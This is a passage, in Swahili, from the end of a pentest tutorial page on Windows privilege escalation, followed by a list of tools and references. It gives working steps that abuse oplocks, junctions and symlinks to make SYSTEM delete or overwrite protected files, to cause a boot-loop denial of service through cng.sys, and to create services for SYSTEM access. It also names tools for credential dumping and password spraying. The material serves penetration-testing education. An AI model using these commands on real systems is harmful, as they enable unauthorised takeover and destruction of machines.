// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha mchakato wa SYSTEM (k.m., `SilentCleanup`)
- Mchakato huu hukagua folda (k.m., `%TEMP%`) na kujaribu kufuta yaliyomo.
- Unapofikia `file1.txt`, **oplock huanzishwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` hadi mahali pengine
    - Hii humwaga `folder1` bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — kufanya hivyo kungeachilia oplock mapema.

- Chaguo B: Badilisha `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga internal stream ya NTFS inayohifadhi metadata ya folder — kuifuta kunafuta folder.

5. Hatua ya 5: Release the oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka kwa Uwezo wa Kuunda Folda Popote hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **kuunda folda popote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **Windows driver muhimu**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na driver ya kernel-mode ya `cng.sys`.
- Ukiunda njia hiyo mapema kama folda, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Huona folda hiyo, hushindwa kutatua driver halisi, na mfumo hu-crash au kuwasha hukwama.
- Hakuna njia mbadala wala urejeshaji bila uingiliaji wa nje (kwa mfano, kurekebisha boot au kufikia diski).

### Kutoka njia za logi/backup zenye privileged access + OM symlinks hadi kuandika upya faili yoyote / boot DoS

Huduma yenye privileged access inapoandika logi/export kwenye njia iliyosomwa kutoka kwenye config inayoweza kuandikwa, elekeza njia hiyo kwa kutumia Object Manager symlinks + NTFS mount points ili kubadilisha uandishi huo wenye privileged access kuwa uandishi upya wa faili yoyote (hata bila SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambulizi (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point inayoelekeza kwenye `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Operesheni yenye privileged access inayoandika kwenye njia hiyo (logi, export, ripoti).

**Mlolongo wa mfano**
1. Soma config ili kupata mahali pa logi penye privileged access, kwa mfano, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` ndani ya `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza upya njia bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye haki za juu iandike log (kwa mfano, admin anachochea "send test SMS"). Sasa maandishi yanaandikwa kwenye `C:\Windows\System32\cng.sys`.
4. Kagua faili lengwa lililoandikwa juu yake (hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya kunalazimisha Windows kupakia driver iliyoharibiwa → **boot loop DoS**. Hili pia linatumika kwa faili yoyote iliyolindwa ambayo huduma yenye haki za juu itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo kwenye `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na kuifanya kuwa mahali pa kuaminika pa kusababisha DoS kwa data iliyoharibiwa.



## **Kutoka High Integrity hadi System**

### **Huduma mpya**

Ikiwa tayari unaendesha mchakato wa High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi kwa **kuunda na kutekeleza huduma mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapotengeneza service binary, hakikisha ni service halali au binary inatekeleza vitendo vinavyohitajika haraka, kwani itazimwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye process yenye High Integrity unaweza kujaribu **kuwezesha registry entries za AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege hadi System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### Kutoka SeDebug + SeImpersonate hadi Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata kwenye process yenye High Integrity tayari), utaweza **kufungua karibu process yoyote** (isipokuwa protected processes) kwa kutumia privilege ya SeDebug, **kunakili token** ya process hiyo, na kuunda **process yoyote ukitumia token hiyo**.\
Kwa kawaida, mbinu hii **huchagua process yoyote inayoendeshwa kama SYSTEM yenye token privileges zote** (_ndiyo, unaweza kupata SYSTEM processes zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter kuongeza privilege kupitia `getsystem`. Mbinu hii inahusisha **kutengeneza pipe na kisha kuunda/ kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyotengeneza pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya pipe client (service) na kupata privileges za SYSTEM.\
Ukitaka [**kujifunza zaidi kuhusu name pipes, soma hapa**](#named-pipe-client-impersonation).\
Ukitaka kusoma mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes, soma hapa**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **kuteka dll** inayokuwa **loaded** na **process** inayoendeshwa kama **SYSTEM**, utaweza kutekeleza arbitrary code kwa kutumia permissions hizo. Kwa hiyo, Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation; zaidi ya hayo, ni **rahisi zaidi kuitekeleza kutoka kwenye process yenye high integrity**, kwani itakuwa na **write permissions** kwenye folders zinazotumika kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **Kutoka Administrator au Network Service hadi System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Kutoka LOCAL SERVICE au NETWORK SERVICE hadi full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla na RDP. Tumia -Thorough kwenye local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hufanya password spraying kwenye domain kwa kutumia passwords zilizokusanywa**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ADIDNS/LLMNR/mDNS spoofing na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windows privesc enumeration ya msingi**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta vulnerabilities zinazojulikana za privesc (IMEBADILISHWA na Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa local **(Inahitaji Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta vulnerabilities zinazojulikana za privesc (inahitaji kucompile kwa kutumia VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Huchunguza host kutafuta misconfigurations (ni zaidi ya zana ya kukusanya taarifa kuliko privesc) (inahitaji kucompile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (exe iliyocompile tayari inapatikana github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyocompile tayari inapatikana github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa msingi wa chapisho hili (haihitaji accesschk ili kufanya kazi ipasavyo, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unapaswa kucompile project kwa kutumia toleo sahihi la .NET ([tazama hapa](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya victim, unaweza kufanya hivi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```



## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kupandisha privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo mtindo mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo Kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha hakiki ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Phishing kupitia SMTP kwa macro ya Word VBA → usimbuaji wa credential za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak ya format-string + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya kwenye Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Udhaifu wa Privileged File System katika Mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za Kujaribu Symbolic Link – matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia Vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi hatari wa moduli kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduli za Node.js: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za orodha hakiki ya C/C++, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own na Microslop: Kuunganisha CLDFLT na Masharti ya Mashindano ya Kernel ya DirectX kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja ya Kuwatawala Wote: Primitive Kamili ya Exploit ya Kusoma/Kuandika kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia Vibaya Ufutaji wa Faili Zisizobainishwa ili Kupandisha Privilege na Ujanja Mwingine Mzuri](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Windows 10 Local Privilege Escalation ya Siku 1](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Jinsi Mabadiliko ya Picha Yanavyosababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa Ssh Private Keys kutoka kwa Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kubadilisha Seva za Enterprise Update kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kubadilisha Seva za Enterprise Update kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Windows Installer: Privilege Escalation kupitia Ufutaji wa Folda](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Kufuatilia Hatua Zako Kurudi hadi NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Ushauri kuhusu Privilege Escalation kupitia shared-memory offsets za Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
